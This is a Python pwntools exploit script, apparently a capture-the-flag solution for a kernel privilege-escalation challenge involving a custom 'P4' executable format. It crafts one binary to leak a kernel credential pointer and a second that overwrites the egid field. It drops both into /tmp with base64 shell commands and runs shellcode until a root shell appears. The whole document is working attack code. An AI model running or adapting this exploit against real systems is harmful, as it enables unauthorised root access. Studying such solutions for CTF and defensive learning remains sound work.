#!/usr/bin/env python
from pwn import *
import sys

context.arch = 'amd64'
#context.log_level = 'debug'

segment_hdr_off = 0x30
text_off = 0xa0
load_addr = 0x800000
length = 0x800
RX = 0x5
clear = 0x8

r = remote('localhost', 4000)

def pwnp4():
    p4_leak = 'P4\x00'
    p4_leak += p8(1) # version number
    p4_leak += p32(1) # number of segments
    p4_leak += p64(0xb0) # offset of segment header, use it to leak cred ptr in struct linux_binprm
    p4_leak += p64(0) # elf entry
    p4_leak = 'echo \'' + b64e(p4_leak) + '\' | base64 -d > /tmp/leak; chmod +x /tmp/leak; /tmp/leak'

    r.sendlineafter('/ $ ', p4_leak)
    r.recvuntil('length=')
    cred = int(r.recvuntil(',', drop=True), 16)
    print 'leak cred:', hex(cred)

    egid = cred + 0x18

    p4_pwn = 'P4\x00'
    p4_pwn += p8(1) # version number
    p4_pwn += p32(2) # number of segments
    p4_pwn += p64(segment_hdr_off) # offset of segment header
    p4_pwn += p64(load_addr + text_off) # elf entry
    p4_pwn = p4_pwn.ljust(segment_hdr_off, '\x00')

    # segment header (addr, len, offset)
    # 1
    p4_pwn += p64(load_addr | RX)
    p4_pwn += p64(length) # align up to 0x1000
    p4_pwn += p64(0) # caution: offset must be a multiple of the page size (see `man mmap`)
    # 2
    p4_pwn += p64(egid | clear)
    p4_pwn += p64(0x44)
    p4_pwn += p64(0)

    p4_pwn = p4_pwn.ljust(text_off, '\x00')

    p4_pwn += asm(shellcraft.sh())
    p4_pwn = 'echo \'' + b64e(p4_pwn) + '\' | base64 -d > /tmp/pwn; chmod +x /tmp/pwn;'

    r.sendlineafter('/ $ ', p4_pwn)

    for _ in range(10):
        r.sendline('/tmp/pwn')
        r.recvuntil('/ ')
        sh = r.recvn(2)

        if sh[0] == '#':
            r.interactive()
            sys.exit()

for _ in range(10):
    try:
        pwnp4()
    except KeyboardInterrupt:
        sys.exit()
    except Exception:
        continue

